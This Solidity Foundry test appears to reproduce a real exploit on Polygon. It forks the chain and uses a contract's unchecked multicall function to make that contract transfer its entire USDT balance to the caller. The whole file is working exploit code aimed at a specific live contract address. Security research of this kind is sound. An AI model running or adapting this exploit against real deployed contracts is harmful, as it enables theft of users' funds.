// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Address https://polygonscan.com/address/0x940ce652a51ebadb5df09d605dbeda95fdcf697b
interface Target {
    struct Call {
        address target;
        bytes callData;
        uint256 value;
    }

    function multicallWithoutCheck(Call[] memory calls) external;
}

contract ContractTest is Test {
    struct Call {
        address target;
        bytes callData;
        uint256 value;
    }

    Target target = Target(0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b);
    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("polygon", 34_743_770);
    }

    function testExploit() public {
        uint256 USDTBlance = USDT.balanceOf(address(target));
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", address(this), USDTBlance);
        Target.Call memory inputData = Target.Call({target: address(USDT), callData: data, value: 0});
        Target.Call[] memory calls = new Target.Call[](1);
        calls[0] = inputData;
        target.multicallWithoutCheck(calls);

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 6);
    }
}
